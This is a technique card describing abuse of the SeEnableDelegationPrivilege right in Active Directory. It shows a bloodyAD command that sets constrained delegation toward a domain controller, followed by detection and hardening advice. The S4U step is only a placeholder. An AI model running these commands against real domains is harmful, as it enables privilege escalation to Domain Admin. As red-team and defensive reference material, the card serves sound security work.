# [PE-TOKEN-007]: SeEnableDelegationPrivilege Abuse

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-TOKEN-007 |
| **MITRE ATT&CK v18.1** | [Access Token Manipulation (T1134)](https://attack.mitre.org/techniques/T1134/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Windows AD |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** `SeEnableDelegationPrivilege` is a user right (assigned via GPO) that allows a user to modify the delegation settings of *other* users/computers. Specifically, it grants write access to the `msDS-AllowedToDelegateTo` attribute. If an attacker compromises a user with this right, they can configure *Constrained Delegation* on any account (e.g., a compromised service account) to target the Domain Controller (CIFS/LDAP), enabling a Silver Ticket or S4U2self attack to become Domain Admin.
- **Attack Surface:** User Rights Assignment.
- **Business Impact:** **Domain Compromise**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** User with `SeEnableDelegationPrivilege` (often found on Service Accounts).
- **Tools:**
    - [BloodyAD](https://github.com/CravateRouge/bloodyAD)
    - [PowerView](https://github.com/PowerShellMafia/PowerSploit)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Check Privilege**
```bash
Get-DomainUser -Identity "svc_account" | Select-Object -ExpandProperty "distinguishedname"
# Check GPO or explicit rights
```

**Step 2: Abuse (BloodyAD)**
Configure a compromised user (`bob`) to delegate to the DC.
```bash
python3 bloodyAD.py -d domain.local -u svc_account -p 'Pass123!' --host 192.168.1.1 addAllowedToDelegateTo 'bob' 'cifs/DC01.domain.local'
```

**Step 3: Execute (S4U)**
Now use `bob` to impersonate Administrator to the DC.
```bash
getST.py ...
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 AD Logs
| Source | Event | Filter Logic |
|---|---|---|
| **Security** | 4742 | Computer Account Changed. Filter for `msDS-AllowedToDelegateTo` changes by non-admin accounts. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **GPO Audit:** Check "Enable computer and user accounts to be trusted for delegation" in "User Rights Assignment". Ensure only Domain Admins have this.
*   **Protected Users:** Delegation does not work if the target (victim) is in the Protected Users group.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-RECON-002]
> **Next Logical Step:** [CA-UNSC-001]
